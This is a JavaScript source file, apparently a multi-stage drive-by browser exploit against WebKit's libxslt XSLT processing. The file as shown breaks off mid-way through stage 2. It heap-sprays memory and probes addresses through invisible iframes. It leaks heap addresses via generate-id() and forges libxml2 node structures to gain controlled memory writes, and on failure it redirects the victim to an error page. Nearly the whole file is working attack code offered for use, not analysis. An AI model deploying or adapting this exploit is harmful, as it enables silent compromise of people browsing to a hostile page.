/** @define {boolean} */
var ENABLE_DEBUG = false;

var INVISIBLE = true;

// [ Logging and utility functions ] ---------------------------------------- //

var SEND_LOG = false;

var INFO = function(){};
// var ERR  = function(){};
var send_info = function(){};
var send_error = function(){};

if (ENABLE_DEBUG === true) {
    var send_info = function(string) {
	var req = new XMLHttpRequest();
	var formdata = new FormData();
	formdata.append("logdata", string);
	req.open("POST", "log/info", true);
	req.send(formdata);
    };

    var send_error = function(string) {
	var req = new XMLHttpRequest();
	var formdata = new FormData();
	formdata.append("logdata", string);
	req.open("POST", "log/error", true);
	req.send(formdata);
    };

    ERR = function(string) {
	if (string === undefined) {
	    string = "Unspecified error";
	}

	restorebrowserstate();

	console.log("EXPLOIT ERROR: " + string);
	send_error(string);
	alert("EXPLOIT ERROR: " + string);
	throw new Error(string);
    };

    INFO = function(string) {
	console.log(string);
	if (SEND_LOG === true) {
	    send_info(string);
	}
    };
} else {

    ERR = function() {
    	restorebrowserstate();
    	do_redirect();
    };
}

function do_redirect() {
    window.location.replace("error.php");
    throw Error();
}

function restorebrowserstate() {
    // Attempt to leave the browser in a useable state (not always possible)
    if (window['g_xsltobj'] !== undefined && window['g_xsltobj'].alive) {
	window['g_xsltobj'].terminate();
    }
}

function hex(x, pad) {
    var s = x.toString(16);
    if (pad === undefined) return s;
    
    var pads = Array(pad+1).join("0");
    var result = (pads+s).slice(-pads.length);
    if (s.length > result.length) {
	return s;
    } else {
	return result;
    }
}

// [ Convenience spray page handling object ] ------------------------------- //

/**
 * @constructor
 */
function Page(uint32array, base, index) {
    // It would be cleaner to work on the underlying ArrayBuffer object
    // but I've seen problems on some phones with this approach, so let's
    // stick with 32-bit modifications.
    
    if (index === undefined) {
	index = 0;
    }
    this.array = uint32array;
    this.base = base;
    this.index = index;
    this.size = this.array.length * 4;
}

Page.prototype.write = function (addr, content) {
    var where = addr - (this.base + 0x8);
    var what = content;
    if ((where - this.base)/4  + this.index > this.array.length) {
	throw new Error("Attempt to write beyond array boundaries");
    }
    if (typeof(what) == "number") {
	this.array[where/4 + this.index] = what;
	return;
    }

    // Raw byte array
    var size = Math.floor((what.length + 3) / 4) * 4; // Align to 4 bytes
    var buffer = new ArrayBuffer(size);
    var uint8v = new Uint8Array(buffer);
    var uint32v = new Uint32Array(buffer);

    for (var i = 0; i < what.length; i++) {
	uint8v[i] = what[i];
    }

    for (var i = 0; i < uint32v.length; i++) {
	this.array[where/4 + this.index + i] = uint32v[i];
    }
};

// Reads a dword.
Page.prototype.read = function (addr) {
    var where = addr - (this.base + 0x8);
    if ((where - this.base)/4  + this.index > this.array.length) {
	throw new Error("Attempt to write beyond array boundaries");
    }
    return this.array[where/4 + this.index];
};

// Apply layout (note that this is *not* used when creating the first
// spray in order to make it a bit faster)
Page.prototype.apply_layout = function(layout) {
    for (var k = 0; k < layout.length; k++) {
	var el = layout[k];
	this.write(el[0], el[1]);
    }
};

Page.prototype.in_range = function(addr) {
    var where = addr - (this.base + 0x8);
    if ((where - this.base)/4 + this.index > this.array.length) {
	return false;
    }
    return true;
};

// [ String utility functions ] --------------------------------------------- //

// Converts an ASCII string to an integer array which contains each char's byte
// value and null-terminates it (with a 0x00 element)
// if nullterm is false, the string is not null terminated.
function stringtoarray(s, nullterm) {
    if (nullterm === undefined) {
	nullterm = true;
    }
    
    var res = [];
    
    for (var i = 0; i < s.length; i++) {
	res.push(s.charCodeAt(i));
    }

    if (nullterm === true) {
	res.push(0x0);
    }

    return res;
}

// Converts an integer array to a javascript string. Array null-termination is ignored.
function arraytostring(arr) {
    if (arr[arr.length] === 0) {
	arr.splice(arr.length-1, 1);
    }
    return String.fromCharCode.apply(null, arr);
}

// [ Heap spray functions ] ------------------------------------------------- //

// Checks that no value has been defined twice
// For now it only works with 32bit values (no raw byte arrays supported)
function layout_check(base, layout) {
    var mem = {};
    for (var k = 0; k < layout.length; k++) {
	var el = layout[k];
	var where = el[0] - (base + 0x8);
	var what = el[1];

	if (where in mem) {
	    var adstring = "0x" + base.toString(16) + " + 0x" + where.toString(16);
	    ERR("layout_check ERROR: redefinition of memory address " + adstring + ". " + 
		"Previous definition was 0x" + mem[where].toString());
	    return false;
	}
	mem[where] = what;
    }
    return true;
}

var bigmem = [];

function apply_layout(base, page, index, layout) {
    for (var k = 0; k < layout.length; k++) {
	var el = layout[k];
	var where = el[0] - (base + 0x8);
	var what = el[1];
	if (typeof(what) == "number") {
	    page[where/4 + index] = what;
	    continue;
	}

	// Raw byte array
	var size = Math.floor((what.length + 3) / 4) * 4; // Align to 4 bytes
	var buffer = new ArrayBuffer(size);
	var uint8v = new Uint8Array(buffer);
	var uint32v = new Uint32Array(buffer);

	for (var i = 0; i < what.length; i++) {
	    uint8v[i] = what[i];
	}

	for (var i = 0; i < uint32v.length; i++) {
	    page[where/4 + index + i] = uint32v[i];
	}
    }
}

function map_pages(layout, num) {
    var M1024 = 0xffff4;
    var SIZE = M1024;

    for (var i = 0; i < num; i++) {
	var page;
	try {
            page = new Uint32Array(SIZE);
            bigmem.push(page);
	} catch (e) {
	    INFO("Can't map more pages (" + i + ")");
	    for (var j = i - 60; j < i; j++) {
		// This way the gc might be triggered more easily
		delete bigmem[j];
		bigmem.splice(j, 1);
	    }
	    break;
	}
	
	apply_layout(0, page, 0, layout);
    }

}

function search_pages(offset, comparevalue) {
    for (var i = 0; i < bigmem.length; i++) {
	var page = bigmem[i];
	for (var j = 0; j < 1024; j++) {
	    var data = page[j*1024 + (offset - 0x8)/4];
	    if (data != comparevalue) {
		return {data:data, index:i, displ:j};
	    }
	}
    }
    return null;
}

// [ xml/xsl and text handling ] -------------------------------------------- //

function parseXML(string) {
    var parser = new DOMParser();
    var xml = parser.parseFromString(string, "text/xml");
    // TODO error checking
    return xml;
}

function loadXML(filename) {
    var req = new XMLHttpRequest();
    req.open("GET", filename, false);
    req.send();
    // TODO error checking
    return req.responseXML;
}

function loadtext(filename) {
    var req = new XMLHttpRequest();
    req.open("GET", filename, false);
    req.send();
    // TODO error checking
    return req.responseText;
}


// [ Entry point ] ---------------------------------------------------------- //

function start(){
    // if (!window.confirm("Start?")) return;

    stage0();

}

window["start"] = start;

var trk = 0;

function redirmessage() {
    window.setTimeout(function() {
	var p = document.createElement("p");
	p.innerHTML = "";
	document.body.appendChild(p);
    }, 2500);
}


// [ Stage 0 ] -------------------------------------------------------------- //

// Stage 0 sets up the memory so that there are 0x1000 bytes at a controlled
// address. The process is stabilized and the address is verified.

function stage0() {

    redirmessage();

    var layout = transformlayout(0x0);

    map_pages(layout, 330);
    INFO("pages mapped.");

    find_spray_addr(0x7a703030, 0x79303030, -0x10000);

    return;

}

// These functions spray the memory, examine the address space and find
// A controlled address where to write exploit data.
function stage0_done(n, addr) {
    INFO("Found address " + hex(addr) + " @ page " + n);
    // Compute base
    var base = (addr & 0xffffff00)>>>0;
    stage1(base, n);
    return;
}

function stage0_fail(addr) {
    ERR("The spray could not be found in memory ( reached " + hex(addr) + ")");
}

function transformlayout(base) {
    // String: "http://www.w3.org/1999/XSL/Transform"
    
    // [0x70747468, 0x772f2f3a, 0x772e7777, 0x726f2e33,
    //  0x39312f67, 0x582f3939, 0x542f4c53, 0x736e6172,
    //  0x6d726f66]

    var layout = [];

    for (var i = 0; i < 16 * 4; i++) {
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x30, 0x70747468]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x34, 0x772f2f3a]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x38, 0x772e7777]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x3c, 0x726f2e33]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x40, 0x39312f67]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x44, 0x582f3939]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x48, 0x542f4c53]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x4c, 0x736e6172]);
	layout.push([base + i * 0x10000 + (i%16) * 0x1000 + 0x50, 0x6d726f66]);
    }

    return layout;
}

// find_spray_addr performs a search for the XSLT string at address addr.
// If it is not found, it keeps incrementing/decrementing the address
// by the value increment until either the string is found or the address
// stop is hit. Addresses which are not valid XML strings are skipped.
function find_spray_addr(addr, stop, increment) {
    if ((increment >= 0) && (addr > stop)) {
	stage0_fail(addr);
	return;
    }
    
    if ((increment <= 0) && (addr < stop)) {
	stage0_fail(addr);
	return;
    }

    while (((addr & 0xff00) == 0x3c00) || ((addr & 0xff00) == 0x3e00) ||
    	   ((addr & 0xff0000) == 0x3c0000) || (addr & 0xff0000) == 0x3e0000) {
	addr = addr + increment;
    }

    if ((addr & 0x00ff00)>>>0 < 0x002000) {
	if (increment > 0) {
	    addr = ((addr & 0xffff00ff)>>>0) ^ 0x002000;
	} else {
	    addr = ((addr - 0x010000) & 0xffff00ff)>>>0 ^ 0x00007000;
	}
    }

    if ((addr & 0x00ff00) > 0x007a00) {
	if (increment > 0) {
	    addr = ((addr & 0xffff00ff)>>>0 + 0x10000) ^ 0x002000;
	} else {
	    addr = (addr & 0xffff00ff)>>>0 ^ 0x007000;
	}
    }

    if ((addr & 0x00ff0000)>>>0 < 0x00200000) {
	if (increment > 0) {
	    addr = (addr & 0xff00ffff)>>>0 ^ 0x00200000;
	} else {
	    addr = ((addr - 0x01000000) & 0xff00ffff)>>>0 ^ 0x007a0000;
	}
    }

    if ((addr & 0x00ff0000) > 0x007a0000) {
	if (increment > 0) {
	    addr = ((addr & 0xff00ffff)>>>0 + 0x1000000) ^ 0x00200000;
	} else {
	    addr = (addr & 0xff00ffff)>>>0 ^ 0x007a0000;
	}
    }

    var sheetblob = createsheetblob(addr);
    var docblob = createdocblob(sheetblob.url);

    var iframe = document.createElement("iframe");

    if (INVISIBLE === true) {
	iframe.style.height = 0;
	iframe.style.width = 0;
	iframe.style.border = "none";
    }
    
    var iframesrc = docblob.url;
    iframe.src = iframesrc;
    iframe.onload = function (e) {
	var url = e.currentTarget.contentWindow.location.href;
	// var frameaddr = parseInt(url.substring(url.indexOf(prefix) + prefix.length));
	if (url != iframesrc) {
	    ERR("PHANTOM BUG: expecting " + iframesrc + ", got " + url);
	}
	// INFO("find_spray_addr iframe load " + frameaddr);
	var htmlelem = e.currentTarget.contentWindow.document.documentElement;
	if (htmlelem === null || htmlelem.textContent.indexOf("error") != -1) {
	    start_bisect(addr);
	    return;
	} else {
	    find_spray_addr(addr + increment, stop, increment);
	    return;
	}
    };
    document.body.appendChild(iframe);
    return;

}

function start_bisect(addr) {
    INFO("starting bisect @ " + hex(addr));
    bisect(0, bigmem.length-1, addr);
}

function bisect_clear(a, b) {
    for (var j = a; j <= b; j++) {
	for (var i = 0; i < 16 * 4; i++) {
	    var index = (i * 0x10000 + (i%16) * 0x1000 + 0x30 - 0x8) / 4;
	    bigmem[j][index] = 0;
	}
    }
}

function bisect_putback(a, b) {
    for (var j = a; j <= b; j++) {
	for (var i = 0; i < 16 * 4; i++) {
	    var index = (i * 0x10000 + (i%16) * 0x1000 + 0x30 - 0x8) / 4;
	    bigmem[j][index] = 0x70747468;
	}
    }
}

function bisect(a, b, addr) {
    if (a == b) {
	stage0_done(a, addr);
	return;
    }

    var n = b - a + 1;
    var mid = a + (Math.floor(n/2));
    bisect_clear(a, mid-1);

    var bisect_firsthalf = function() {
	bisect_putback(a, mid-1);
	bisect(a, mid-1, addr);
    };

    var bisect_secondhalf = function() {
	bisect_putback(mid, b);
	bisect(mid, b, addr);
    };

    bisect_check(bisect_firsthalf, bisect_secondhalf, addr);
    return;
}


function bisect_check(bisect_firsthalf, bisect_secondhalf, addr) {
    // INFO("bisect_check " + addr);

    var iframe = document.createElement("iframe");

    var sheetblob = createsheetblob(addr);
    var docblob = createdocblob(sheetblob.url);
    // var prefix = "ad.xml?contentId=";
    var iframesrc = docblob.url;

    if (INVISIBLE === true) {
	iframe.style.height = 0;
	iframe.style.width = 0;
	iframe.style.border = "none";
    }
    
    iframe.src = iframesrc;
    iframe.onload = function (e) {
	var url = e.currentTarget.contentWindow.location.href;
	if (url != iframesrc) {
	    ERR("PHANTOM BUG: expecting " + iframesrc + ", got " + url);
	}
	var htmlelem = e.currentTarget.contentWindow.document.documentElement;
	if (htmlelem === null || htmlelem.textContent.indexOf("error") != -1) {
	    bisect_secondhalf();
	    return;
	} else {
	    bisect_firsthalf();
	    return;
	}
    };
    // alert("ready to insert iframe");
    document.body.appendChild(iframe);
    return;

}

function toascii(addr) {
    var arr = [(addr >>  0) & 0xff,
	       (addr >>  8) & 0xff,
	       (addr >> 16) & 0xff,
	       (addr >> 24) & 0xff];
    return arraytostring(arr);
}

function createdocblob(sheeturl) {
    var doc = '<?xml-stylesheet type="text/xsl" href="' + sheeturl + '"?><root/>';

    return createblob(doc, "application/xml");
}

function createsheetblob(addr) {
    var doc = "";
    doc += "<!DOCTYPE adoc [";
    doc += "<!-- x -->";
    doc += '<!ENTITY cdent "';
    doc += '<html>XX';
    doc += toascii(addr);	// ns->href
    doc += toascii(addr);	// ns->prefix
    doc += 'XXXX'		// ns->_private
    doc += 'XXXX'		// ns->context
    doc += '<xsl:message xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' terminate=\'yes\'/></html>">'
    doc += "<!-- y -->"
    doc += "]>" + "\n"
    doc += '<ata xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">&cdent;</ata>'

    return createblob(doc, "text/xsl");
}

// Blob convenience function
function createblob(content, contenttype) {
    var builder = new WebKitBlobBuilder();
    builder.append(content);
    var blob = builder.getBlob(contenttype);
    var url = webkitURL.createObjectURL(blob);
    return {blob: blob, url:url};
}


// [ Stage 1 ] -------------------------------------------------------------- //


// All fields but the last two are sized 4
// Total size: 60 bytes

// type = struct _xmlNode {
//  0   void *_private;
//  4   xmlElementType type;
//  8   const xmlChar *name;
// 12   struct _xmlNode *children;
// 16   struct _xmlNode *last;
// 20   struct _xmlNode *parent;
// 24   struct _xmlNode *next;
// 28   struct _xmlNode *prev;
// 32   struct _xmlDoc *doc;
// 36   xmlNs *ns;
// 40   xmlChar *content;
// 44   struct _xmlAttr *properties;
// 48   xmlNs *nsDef;
// 52   void *psvi;
// 56   short unsigned int line;   // size 2
// 58   short unsigned int extra;  // size 2
// }

function stage1(base, pagenum) {
    INFO("> [ Stage 1 ]");
    
    var iframe = document.createElement("iframe");
    
    var src = "stage1_xml.py?id=" + base.toString();

    iframe.src = src;

    if (INVISIBLE === true) {
	iframe.style.height = 0;
	iframe.style.width = 0;
	iframe.style.border = "none";
    }
    
    iframe.onload = function (e) {
	var url = e.currentTarget.contentWindow.location.href;
	if (e.currentTarget.contentWindow.location.href.indexOf("stage1_xml.py?id=") == -1) {
	    ERR("PHANTOM BUG: iframe src and event target don't match! " + url + " expecting " + src);
	}
	    
	var xml = iframe.contentWindow.document;
	if (xml === undefined) {
	    ERR("Cannot process source XML document");
	}
	
	var XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' + 
    	    '<xsl:template match="/*">' +
	    '<data>' +
	    '<xsl:value-of select="generate-id()" />' +
	    '</data>' +
    	    '</xsl:template>' +
    	    '</xsl:stylesheet>';

	var xsl = parseXML(XSL);

	INFO("ready to process generate-id stylesheet");
	var processor = new XSLTProcessor();
	processor.importStylesheet(xsl);
	var res = processor.transformToDocument(xml);
	if (res === undefined) {
	    ERR("Cannot process XML with generate-id stylesheet");
	}

	var id = res.getElementsByTagName("data")[0];
	var firstid = id.childNodes[0].nodeValue;

	processor = new XSLTProcessor();
	processor.importStylesheet(xsl);
	res = processor.transformToDocument(xml);
	if (res === undefined) {
	    ERR("Cannot process XML with generate-id stylesheet a second time");
	}

	id = res.getElementsByTagName("data")[0];
	var secondid = id.childNodes[0].nodeValue;

	INFO(" first id: " + firstid);
	INFO("second id: " + secondid);

	if (firstid != secondid) {
	    ERR("No infoleak available " + firstid + " " + secondid);
	}

	var documentarea = parseInt(firstid.substring(2)) * 60;

	INFO("documentarea: " + documentarea.toString(16));

	if (documentarea < 0x10000 || documentarea > 0xffffffff) {
	    ERR("Strange infoleak address: " + hex(documentarea));
	}

	xslt_exploit(iframe, xml, base, documentarea, pagenum);
    };

    document.body.appendChild(iframe);

}

function xslt_exploit(iframe, xml, base, documentarea, pagenum) {

    documentarea += 56;
    documentarea += 4;

    var layout = createstage1layout(base, documentarea);
    var page = bigmem[pagenum];

    // Do spring cleaning and fill this page
    for (var i = 0; i < 16 * 4; i++) {
	var index = (i * 0x10000 + (i%16) * 0x1000) / 4;
	for (var j = 0; j < 40; j++) {
	    page[index - 2 + 0x30/4 + j] = 0;
	}
	apply_layout(base, page, index, layout);
    }

    var XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
	'<xsl:template match="ztX">' +
	'  <xsl:if test="text()=ELZ">' +
	'    <xsl:apply-templates/>' +
	'    <xsl:message terminate="yes"/>' +
	'  </xsl:if>' +
	'</xsl:template>' +
	'<xsl:template match="/*">' + 
	'  <xsl:for-each select="namespace::*">' +
	'    <xsl:if test="position() = 2">' +
	'      <xsl:apply-templates />' +
	'    </xsl:if>' + 
	'  </xsl:for-each>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    var xsl = parseXML(XSL);
    var processor = new XSLTProcessor();
    processor.importStylesheet(xsl);
    var result = processor.transformToDocument(xml);

    var displ = null;
    var data = null;
    for (var j = 0; j < 1024; j++) {
	data = page[j*1024 + (0x70 + 24 - 0x8)/4];
	if (data !== 0) {
	    displ = j;
	    break;
	}
    }

    if (displ === null) {
	ERR("Modified page not found :(");
    }

    // The value (data) MUST be base + 0x44.
    // This can be used as a server-side check to verify if the next part of the
    // exploit should be sent.

    trk += data & 0xff; // trk = 0x44

    // Compute page base and reposition
    var pagebase = ((data & 0xffffff00)>>>0) - displ*1024*4;

    if (ENABLE_DEBUG) {
	var dbgstring = "FOUND IT :) " + data.toString(16) +
	    " [index: " + pagenum + ", displ: " + displ + "]" +
	    " pagebase: " + hex(pagebase) + " base: " + hex(base);

	INFO(dbgstring);
    }

    // End of stage0. At this point we have ~4MB completely controlled at a
    // controlled address and a trashed XML object with a known address on the heap.

    var pageobj = new Page(page, pagebase, 0);

    stage2(pageobj, base, iframe, xml, documentarea);
}

function createstage1layout(base, documentarea) {
    // Note that the NULLs can actually be removed, they are in place
    // just as a reminder NOT to change them and to make layout_check
    // complain if they are redefined

    // Compute the addresses for the 0x12 node
    var targetaddr = base + 0x1d0;
    var taA = (targetaddr >>  0) & 0xff;
    var taB = (targetaddr >>  8) & 0xff;
    var taC = (targetaddr >> 16) & 0xff;
    var taD = (targetaddr >> 24) & 0xff;

    var dword22 = (taA << 16) | (taB << 24);
    var dword26 = (taD <<  8) | taC;

    var layout = [

	[base +  0x12 +  2, 0x00030000],        // node12->type = XML_TEXT_NODE [unaligned +2]
	[base +  0x12 + 22, dword22],
	[base +  0x12 + 26, dword26],           // node12->next = DTDclear [unaligned +2]
	[base +  0x12 + 30, 0],
	[base +  0x12 + 34, 0],

	// next (struct _xmlNode), doc (struct _xmlDoc) [overlapping]
	// next is also the first ztX node
	[base +  0x44 +  4, 1],                 // ztX->type = XML_ELEMENT_NODE (1)
	[base +  0x44 +  8, base + 0x1c0],      // ztX->name = "ztX"
	[base +  0x44 + 12, base + 0xf0],       // ztX->children = comparetext
	[base +  0x44 + 24, base + 0x2c8],      // ztX->next = next ztX node
	// IMPORTANT: base + 0x44 + 28 will become cur->prev (base + 0x70)

	// 0 [base +  0x34 + 44, 0x0],          // doc->intSubset = NULL
	// 0 [base +  0x34 + 48, 0x0],          // doc->extSubset = NULL
	[base +  0x34 + 80, base + 0xb0],       // doc->dict

	// prev: base + 0x70
	// IMPORTANT: base + 0x70 + 24 will become cur->next (base + 0x44)

	// Reference node (struct _xmlNode): base + 0x90
	[base +  0x90 +  4, 3],                 // refnode->type = XML_TEXT_NODE (3)
	[base +  0x90 + 40, base + 0x1c8],      // refnode->content = "\x01\x00"

	// doc->dict (struct _xmlDict)
	[base +  0xb0 + 16, base + 0xd0],       // doc->dict->strings
	// 0 [base +  0xb0 + 20, 0x0],          // doc->dict->subdict

	// doc->dict->strings (struct _xmlDictStrings)
	// 0 [base +  0xd0 +  0, 0x0],          // doc->dict->strings->next
	[base +  0xd0 +  4, 0xefffffff],        // doc->dict->strings->free

	// comparetext (struct _xmlNode)
	[base +  0xf0 +  4, 3],                 // comparetext->type = XML_TEXT_NODE (3)
	[base +  0xf0 + 24, base + 0x16c],      // comparetext->next = ELZ
	[base +  0xf0 + 40, documentarea],      // comparetext->content = candidate location (to compare)

	// children (struct _xmlNode): base + 0x130
	[base + 0x130 +  4, 14],                // children->type = XML_DTD_NODE (14)
	// 0 [base + 0x130 + 24, 0x0],          // children->next = NULL
	// 0 [base + 0x130 + 32, 0x0],          // children->doc  = NULL

	// ELZ node (struct _xmlNode)
	[base + 0x16c +  4, 1],                 // ELZ->type = XML_ELEMENT_NODE (1)
	[base + 0x16c +  8, base + 0x1c4],      // ELZ->name = "ELZ"
	[base + 0x16c + 12, base + 0x90],       // ELZ->children = refnode
	[base + 0x16c + 24, base + 0x190],      // ELZ->next = DTDoverwrite

	// DTDoverwrite node
	[base + 0x190 +  4, 14],                // DTDoverwrite->type = XML_DTD_NODE
	[base + 0x190 + 24, base + 0x12],       // DTDoverwrite->next = node12
	[base + 0x190 + 28, documentarea - 24], // DTDoverwrite->prev = candidate location - offset(next)

	// Strings
	[base + 0x1c0, 0x0058747a],             // "ztX\0"
	[base + 0x1c4, 0x005a4c45],             // "ELZ\0"
	[base + 0x1c8, 0x00000001],             // "\x01\x00" (reference string)

	// DTDclear node
	[base + 0x1d0 +  4, 14],                // DTDclear->type = XML_DTD_NODE (14)
	// 0 [base + 0x1d0 + 24, 0x0],          // DTDclear->next = NULL
	[base + 0x1d0 + 28, documentarea + 1 - 24], // DTDclear->prev = candidate location + 1 - offset(next)

    ];

    var ztbase;

    for (var i = 2; i <= 15; i++) {
	ztbase = base + i * 0x100;
	documentarea -= 4;

	// Compute the addresses for the 0x12 node
	targetaddr = ztbase + 0x9c;
	taA = (targetaddr >>  0) & 0xff;
	taB = (targetaddr >>  8) & 0xff;
	taC = (targetaddr >> 16) & 0xff;
	taD = (targetaddr >> 24) & 0xff;

	dword22 = (taA << 16) | (taB << 24);
	dword26 = (taD <<  8) | taC;

	// INFO("tocheck: " + documentarea.toString(16));

	// node12
	layout.push([ztbase + 0x12 +  2, 0x00030000]);        // node12->type = XML_TEXT_NODE (3) [unaligned +2]
	layout.push([ztbase + 0x12 + 22, dword22]);        
	layout.push([ztbase + 0x12 + 26, dword26]);           // node12->next = DTDclear
	
	// IMPORTANT: ENSURE CLEANUP between layout applications
	layout.push([ztbase + 0x12 + 30, 0x0]);

	// comparetext node
	layout.push([ztbase + 0x40 +  4, 3]);                 // comparetext->type = XML_TEXT_NODE (3)
	layout.push([ztbase + 0x40 + 24, ztbase + 0x6c]);     // comparetext->next = ELZ
	layout.push([ztbase + 0x40 + 40, documentarea]);      // comparetext->content = candidate location

	// ELZ node
	layout.push([ztbase + 0x6c +  4, 1]);                 // ELZ->type = XML_ELEMENT_NODE (1)
	layout.push([ztbase + 0x6c +  8, base + 0x1c4]);      // ELZ->name = "ELZ"
	layout.push([ztbase + 0x6c + 12, base + 0x90]);       // ELZ->children = refnode
	layout.push([ztbase + 0x6c + 24, ztbase + 0xa8]);     // ELZ->next = DTDoverwrite

	// DTDclear node (final XML_DTD_NODE)
	layout.push([ztbase + 0x9c +  4, 14]);                // DTDclear->type = XML_DTD_NODE (14)
	// 0 layout.push([ztbase + 0x9c + 24, 0x0]);          // DTDclear->next = 0
	layout.push([ztbase + 0x9c + 28, documentarea + 1 - 24]); // DTDclear->prev = candidate location + 1 - offset(next)

	// DTDoverwrite node
	layout.push([ztbase + 0xa8 +  4, 14]);                // DTDoverwrite->type = XML_DTD_NODE
	layout.push([ztbase + 0xa8 + 24, ztbase + 0x12]);     // DTDoverwrite->next = node12
	layout.push([ztbase + 0xa8 + 28, documentarea - 24]); // DTDoverwrite->prev = candidate location - offset(next)

	// ztX node
	layout.push([ztbase +  0xc8 +  4, 1]);                // ztX->type = XML_ELEMENT_NODE (1)
	layout.push([ztbase +  0xc8 +  8, base + 0x1c0]);     // ztX->name = "ztX"
	layout.push([ztbase +  0xc8 + 12, ztbase + 0x40]);    // ztX->children = textcompare
	if (i != 15) {
	    layout.push([ztbase +  0xc8 + 24, ztbase + 0x1c8]);  // ztX->next = next ztX node
	}

    }
    
    return layout;
}


// [ Stage 2 ] -------------------------------------------------------------- //

// stage2 accepts a page object
function stage2(page, base, iframe, xml, documentarea) {
    // Area available:
    // 0x3fff00 bytes starting at page.base (~4MB). Can't overwrite from pagebase+0x0 to pagebase+0x7.
    // page is aligned to 0x1000

    INFO("> [ Stage 2 ]");

    var elementaddr = null;
    
    if (page.read(base + 0x12 + 30) !== 0) {
	elementaddr = documentarea - 4;
	INFO("Trashed XML_ELEMENT_NODE: " + elementaddr.toString(16));
    }
    
    for (var i = 2; i <= 15; i++) {
	var ztbase = base + i * 0x100;
	if (page.read(ztbase + 0x12 + 30) !== 0) {
	    if (elementaddr === null)  {
		elementaddr = documentarea - i * 4; // Exact address of the trashed XML_ELEMENT_NODE
		INFO("Trashed XML_ELEMENT_NODE: " + elementaddr.toString(16));
	    } else {
		INFO("WARNING: undefined data trashed");
	    }
	}
    }

    // Create a new base and a document with that base

    var newbase = base + 0x1100;

    if (!page.in_range(base + 0x2000)) {
	newbase = ((page.base & 0xffff0000)>>>0) + 0x10000 + 0x3000;
	INFO((base + 0x2000).toString(16) + " not in range! reducing to " + newbase.toString(16));
    }

    var iframe2 = document.createElement("iframe");
    
    if (INVISIBLE === true) {
	iframe2.style.height = 0;
	iframe2.style.width = 0;
	iframe2.style.border = "none";
    }

    var src = "stage1_xml.py?id=" + base.toString() + "&contentId=" + (newbase + 0x44).toString();

    iframe2.setAttribute("src", src);
    iframe2.onload = function () {
	// Execute the rest of stage2()
	INFO("Document loaded.");
	var xml2 = iframe2.contentWindow.document;
	if (xml2 === undefined) {
	    ERR("Cannot process source XML document");
	}

	var XSL = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' + 
    	    '<xsl:template match="/*">' +
	    '<data>' +
	    '<xsl:value-of select="generate-id()" />' +
	    '</data>' +
    	    '</xsl:template>' +
    	    '</xsl:stylesheet>';

	var xsl = parseXML(XSL);

	var processor = new XSLTProcessor();
	processor.importStylesheet(xsl);
	var res = processor.transformToDocument(xml2);
	if (res === undefined) {
	    ERR("Cannot process XML with generate-id stylesheet");
	}

	var id = res.getElementsByTagName("data")[0];
	var firstid = id.childNodes[0].nodeValue;

	INFO(" first id: " + firstid);

	var documentarea = parseInt(firstid.substring(2)) * 60;
	INFO("documentarea: " + documentarea.toString(16));

	// ADDED
	documentarea += 56;
	documentarea += 4;

	// Spring cleaning
	for (var i = 0; i < 0x1000/4; i++) {
	    page.write(newbase + i*4, 0);
	}

	// Prepare the layout for the second frame
	var layout = createstage1layout(base, documentarea);

	// Ensure that modified memory locations are zeroed out
	layout.push([base + 0x44 + 28, 0x0]);
	layout.push([base + 0x70 + 24, 0x0]);
	for (var i = 2; i <= 15; i++) {
	    layout.push([base + i * 0x100 + 0x12 + 30, 0x0]);
	}

	// Connect the stage0 document to the stage 1 new elements
	// layout.push([base + 0xfc8 + 24, newbase + 0x40]);
    
	// add stage1 specific nodes
	var additions = [
	    [newbase + 0x800 +  0, 0x006e7572],      // "run\0"

	    // run1: overwrite the node type with XML_ELEMENT_NODE
	    [newbase +  0x44 +  4, 0x1],             // run1->type = XML_ELEMENT_NODE
	    [newbase +  0x44 +  8, newbase + 0x800], // run1->name = "run"
	    [newbase +  0x44 + 12, newbase + 0x80],  // run1->children = DTDoverwritetype
	    [newbase +  0x44 + 24, newbase + 0xb0],  // run1->next = run2

	    // DTDoverwritetype
	    [newbase +  0x80 +  4, 14],              // DTDot->type = XML_DTD_NODE
	    [newbase +  0x80 + 28, elementaddr + 4 - 24], // DTDot->prev = trashed->type - offset(next)
	    [newbase +  0x80 + 24, newbase + 0x1],   // DTDot->next = node01

	    // node01
	    [newbase +   0x1 +  3, [0x0, 3]],       // node01->type = XML_TEXT_NODE

	    // run2
	    [newbase +  0xb0 +  4, 0x1],             // run2->type = XML_ELEMENT_NODE
	    [newbase +  0xb0 +  8, newbase + 0x800], // run2->name = "run"
	    [newbase +  0xb0 + 12, newbase + 0xf0],  // run2->children = DTDcleartype
	    [newbase +  0xb0 + 24, newbase + 0x130], // run2->next = run3

	    // DTDcleartype
	    [newbase +  0xf0 +  4, 14],              // DTDct->type = XML_DTD_NODE
	    [newbase +  0xf0 + 28, elementaddr + 5 - 24], // DTDct->prev = trashed->type - offset(next)
	    [newbase +  0xf0 + 24, 0x0],             // DTDct->next = 0 (ensure)

	    // run3
	    [newbase + 0x130 +  4, 1],               // run3->type = XML_ELEMENT_NODE
	    [newbase + 0x130 +  8, newbase + 0x800], // run3->name = "run"
	    [newbase + 0x130 + 12, newbase + 0x170], // run3->children = DTDoverwritechildren
	    [newbase + 0x130 + 24, newbase + 0x1a0], // run3->next = run4

	    // DTDoverwritechildren
	    [newbase + 0x170 +  4, 14],              // DTDoc->type = XML_DTD_NODE
	    [newbase + 0x170 + 24, page.base + 0x1000], // DTDoc->next = new children node
	    [newbase + 0x170 + 28, elementaddr + 12 - 24], // DTDoc->prev = trashed->children - offset(next)

	    // run4
	    [newbase + 0x1a0 +  4, 1],               // run4->type = XML_ELEMENT_NODE
